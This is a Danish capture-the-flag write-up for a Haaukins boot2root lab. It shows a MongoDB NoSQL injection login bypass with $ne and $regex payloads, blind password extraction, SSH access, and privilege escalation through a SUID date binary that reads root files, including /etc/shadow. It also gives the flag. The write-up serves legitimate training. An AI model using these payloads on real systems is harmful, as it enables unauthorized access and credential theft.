NoSQL auth-bypass → blind password-ekstraktion → SSH → SUID date → root.

Boot2RootHaaukins CTF
🎓 Prøv selv først. Trinene viser metoden; det konkrete flag ligger i en sammenklappelig spoiler nederst. Haaukins-flag er ofte per-instans, så det er fremgangsmåden der tæller.
📚 Baggrund: denne opgave bygger på en fælles teknik — læs primeren: Kom i gang: VPN, Hosts og lab-opsætning.

1. NoSQL auth-bypass (MongoDB)

Login-API'et sanerer ikke JSON — send operatorer i stedet for strenge:

curl -H 'Content-Type: application/json' \
  -d '{"username":{"$ne":null},"password":{"$ne":null}}' http://hackswag.hkn/api/v1/users/login
#  -> {"token":"eyJ..."}  (logget ind som første bruger "quantumpulse")

2. Blind $regex-ekstraktion af passwordet

Login giver 200/401 som orakel — udtræk passwordet tegn-for-tegn:

{"username":"quantumpulse","password":{"$regex":"^<prefix>"}}   # 200 hvis match
# -> quAGQNEhdpKkwB4jX6y3MWmS8gT2vCJP (32 tegn)

3. SSH + privesc via SUID date

ssh quantumpulse@<ip>   # det udtrukne password
find / -perm -4000 -type f 2>/dev/null     # /bin/date = SUID root!
date -f /root/flag.txt      # GTFObins: læser filen som root, fejler med indholdet som "invalid date"
#  -> date: invalid date 'DDC{...}'
🚩 Vis løsning & eksempel-flag

Flag: DDC{Brut3-2-D4t3-2-R00t-Fl4g} (Brute→Date→Root).

(Bonus-vuln: JWT HS256 med tom secret "" → tokens kan forges, men API'et har ingen andre endpoints.)

Hvad du har lært

  • Usaniteret JSON-login = NoSQL-operator-injection ($ne, $regex) → bypass + blind ekstraktion.
  • SUID date -f <fil> læser en root-fil (GTFObins); verificér med date -f /etc/shadow.
